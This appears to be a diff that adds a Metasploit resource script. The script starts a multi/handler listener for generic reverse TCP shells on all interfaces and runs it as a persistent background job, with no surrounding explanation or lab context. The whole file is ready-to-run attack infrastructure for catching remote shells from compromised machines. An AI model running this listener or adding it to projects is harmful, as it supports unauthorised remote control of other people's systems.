@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST 0.0.0.0
+set ExitOnSession false
+exploit -j
